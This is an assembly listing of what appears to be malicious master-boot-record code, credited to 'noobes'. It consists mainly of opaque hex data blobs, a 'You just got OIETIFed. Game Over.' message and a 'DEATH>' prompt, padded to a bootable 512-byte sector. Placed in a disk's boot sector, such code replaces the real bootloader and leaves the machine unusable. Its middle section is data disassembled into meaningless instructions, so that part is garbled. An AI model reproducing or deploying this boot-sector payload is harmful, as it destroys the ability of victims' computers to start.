org 0x7C00; credits to noobes
jmp short start
start:
db 0FAh
db 0EAh, 6, 7Ch
dd 0C0310000h, 0C08ED88Eh, 0BCD08Eh, 6C06C77Ch, 0C77CC500h
dd 6E06h, 7006C700h, 0C77CC000h, 7206h, 4EE8FB00h, 7CECBE00h
dd 0BA0065E8h, 8B90032h, 0B00EB400h, 0E810CD2Eh, 0F9E20027h
dd 60034E8h, 7B80068h, 310021B9h, 0F000B8FFh, 0BE07ABF3h
dd 3BE87CF8h, 7D40BE00h, 0E430h, 0EB000000h, 6C7FAF7h
dd 7CEAh, 0EA1639FBh, 0F403737Ch, 50C3F7EBh, 30575106h
dd 0CD03B0E4h, 0B8006810h, 7D0B907h, 0B8FF31h, 5FABF30Fh
dd 0C3580759h, 0EB45056h, 74C084ACh, 0EB10CD04h, 0C35E58F7h
dd 0B00EB450h, 0AC10CD20h, 0A74203Ch, 2E74C084h, 10CD4634h
dd 0C358F1EBh, 7CEA06FFh, 7D24BECFh, 0DB00EB4h, 0AB010CDh
dd 10CD10CDh, 74203CACh, 74C08406h, 0CD463406h, 0F4F1EB10h
dd 0EBF4FDEBh, 90FDh, 61656C50h, 77206573h, 746961h
db  59h ; Y
aOuJustGotOieti db 'ou just got OIETIFed. Game Over.',0Dh,0Ah
db 0Ah
db 'DEATH> ',0
dd 1Fh ;dup(0)
; ---------------------------------------------------------------------------



add     edx, [eax]
add     edx, [eax+edi*2]
and     [ecx], ah
sub     [eax], ebp
sub     [edi], ah
and     [ebx], ch
daa
sub     eax, 293F2023h
xor     esp, [eax]
and     eax, 4B203F34h
dec     esp
or      [ebx], al
adc     [ebx], al
adc     al, 78h ; 'x'
and     [ecx], ah
sub     [eax], ebp
sub     [edi], ah
and     [ds:21203F27H], dh 
sub     [ecx], ebp
and     ah, [edi+edi]
and     esp, [eax]
dec     ebx
dec     esp
or      [ebx], al
adc     [ebx], al
adc     al, 78h ; 'x'
and     [ecx], ah
sub     [eax], ebp
sub     [edi], ah
and     [edx], dh
and     ebp, [edx]
sub     ah, [eax]
daa
and     [edx], ch
das
and     esp, [eax]
daa
sub     [edx], ah
and     [esi], ch
xor     esi, [edx+esi]
and     [edi], bh
sub     [ebx], esi
and     [ebx+4Ch], cl


times 510-($-$$) db 0
        ;Begin MBR Signature
db 0x55 ;byte 511 = 0x55
db 0xAA ;byte 512 = 0xAA